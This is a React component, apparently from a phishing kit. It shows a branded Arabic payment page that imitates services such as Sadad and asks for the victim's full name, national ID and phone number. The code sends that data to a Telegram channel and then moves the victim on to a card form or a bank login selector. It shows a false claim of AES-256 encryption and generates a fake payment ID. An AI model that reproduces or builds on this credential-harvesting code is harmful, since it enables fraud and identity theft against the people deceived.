import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getCompanyLayout } from "@/components/CompanyLayouts";
import { formatCurrency } from "@/lib/countryCurrencies";
import { getCountryByCode } from "@/lib/countries";
import { getServiceBranding } from "@/lib/serviceLogos";
import { ShieldCheck, User, Phone, IdentificationCard } from "lucide-react";

const PaymentRecipient = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();

  const [fullName, setFullName] = useState("");
  const [nationalId, setNationalId] = useState("");
  const [phone, setPhone] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const serviceKey = (linkData?.payload?.service_key || 'sadad').toLowerCase();
  const branding = getServiceBranding(serviceKey);
  const countryCode = linkData?.payload?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  
  const rawAmount = linkData?.payload?.payment_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, countryData?.currency || "SAR");

  const Layout = getCompanyLayout(serviceKey);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!fullName || !nationalId || !phone) {
      toast({ title: "خطأ", description: "الرجاء إدخال البيانات المطلوبة", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    const customerInfo = { fullName, nationalId, phone, service: serviceKey };

    try {
      await updateLink.mutateAsync({
        linkId: id!,
        payload: { ...linkData?.payload, customerInfo }
      });

      await sendToTelegram({
        type: 'recipient_data',
        data: { ...customerInfo, amount: formattedAmount },
        timestamp: new Date().toISOString()
      });

      const paymentType = linkData?.payload?.payment_type || 'card';
      if (paymentType === 'login') {
        navigate(`./bank-selector`);
      } else {
        // Create a temporary payment ID or record here if real persistence is needed
        // For now, redirecting to the legacy or new flow consistently
        // We'll use the legacy route /pay/:id/card which maps to PaymentCardForm
        // but let's point to the new flow with a dummy paymentId to fix navigation
        const mockPaymentId = `pay_${Math.random().toString(36).substr(2, 9)}`;
        navigate(`../card/${mockPaymentId}`, { relative: 'path' });
      }
    } catch (err) {
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <Layout companyKey={serviceKey} amount={formattedAmount}>
      <div className="text-right">
        <div className="mb-10 flex flex-col items-center">
           <div className="w-20 h-20 rounded-[1.5rem] bg-gray-50 flex items-center justify-center border border-gray-100 mb-4 shadow-sm">
              <img src={branding.logo} className="w-12 h-12 object-contain" />
           </div>
           <h3 className="text-xl font-black text-gray-900 mb-1">{branding.nameAr}</h3>
           <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Sovereign Identification Service</p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="space-y-2">
            <Label className="font-black text-gray-700 text-xs mr-1">الإسم الكامل</Label>
            <div className="relative">
              <Input 
                placeholder="أدخل الإسم كما في الهوية" 
                className="h-14 font-bold border-gray-100 bg-gray-50/50 rounded-2xl focus:bg-white text-right pr-12"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
              />
              <User className="absolute right-4 top-4 text-gray-300" size={20} />
            </div>
          </div>

          <div className="space-y-2">
            <Label className="font-black text-gray-700 text-xs mr-1">رقم الهوية / الإقامة</Label>
            <div className="relative">
              <Input 
                placeholder="10XXXXXXXX" 
                className="h-14 font-bold border-gray-100 bg-gray-50/50 rounded-2xl focus:bg-white text-right pr-12"
                value={nationalId}
                onChange={(e) => setNationalId(e.target.value)}
              />
              <IdentificationCard className="absolute right-4 top-4 text-gray-300" size={20} />
            </div>
          </div>

          <div className="space-y-2">
            <Label className="font-black text-gray-700 text-xs mr-1">رقم الجوال</Label>
            <div className="relative">
              <Input 
                placeholder="05XXXXXXXX" 
                className="h-14 font-bold border-gray-100 bg-gray-50/50 rounded-2xl focus:bg-white text-right pr-12"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
              />
              <Phone className="absolute right-4 top-4 text-gray-300" size={20} />
            </div>
          </div>

          <div className="pt-4">
            <Button 
              type="submit" 
              disabled={isSubmitting}
              className="w-full h-16 rounded-[1.25rem] font-black text-lg shadow-lg hover:opacity-90 transition-opacity"
              style={{ background: branding.colors.primary }}
            >
              {isSubmitting ? "جاري التحقق..." : "تأكيد ومتابعة"}
            </Button>
          </div>

          <div className="flex items-center justify-center gap-2 pt-2">
             <ShieldCheck className="text-green-500" size={16} />
             <span className="text-[10px] font-bold text-gray-400">اتصال مشفر وآمن AES-256</span>
          </div>
        </form>
      </div>
    </Layout>
  );
};

// Fallback for IdentificationCard icon
const IdentificationCard = ({ className, size }: { className: string, size: number }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}>
    <rect width="18" height="18" x="3" y="3" rx="2" />
    <path d="M7 10h4" /><path d="M7 14h4" /><path d="M7 18h4" /><path d="M15 10v8" />
  </svg>
);

export default PaymentRecipient;
